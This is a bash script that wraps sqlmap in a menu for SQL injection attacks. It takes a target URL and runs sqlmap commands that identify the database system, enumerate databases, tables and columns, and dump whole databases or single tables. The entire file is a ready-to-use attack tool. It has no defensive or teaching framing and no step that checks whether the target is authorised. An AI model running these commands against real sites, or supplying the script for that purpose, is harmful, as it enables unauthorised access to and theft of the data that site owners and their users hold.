#!/bin/bash

clear

echo "Welcome to SQL Injection Simple With SQLMAP"
echo "Shell Written by Henry Lai (https://github.com/MINHDUC1996)"
echo "SQLMap Project (https://github.com/sqlmapproject/sqlmap)"

echo "Enter URL to inject: "
read URL

for (( ; ; ))
do
	echo "----------------------"
	echo "1. Get Database System and Name"
	echo "2. Dump All Tables in Database"
	echo "3. Get Tables From DB"
	echo "4. Get Columns From Table"
	echo "5. Dump Table"
	echo "6. Exit"
	echo "----------------------"
	echo "Enter choice: "
	read CHOICE
	
	case "$CHOICE" in
		"1" )
			python sqlmap.py -u $URL --dbs --batch
			;;
		"2" )
			echo "Enter Database name to Dump: "
			read DB
			python sqlmap.py -u $URL -D $DB	--dump --threads=5
			;;
		"3" )
			echo "Enter Database to get Tables: "
			read DB
			python sqlmap.py -u $URL -D $DB	--tables	
			;;
		"4" )
			echo "Enter Tables to get Columns: "
			read TABLE
			python sqlmap.py -u $URL -D $DB	-T $TABLE --columns
			;;
		"5" )
			python sqlmap.py -u $URL -D $DB	-T $TABLE --dump --threads=5
			;;
		"6" )
			exit 1
			;;			
	esac
done
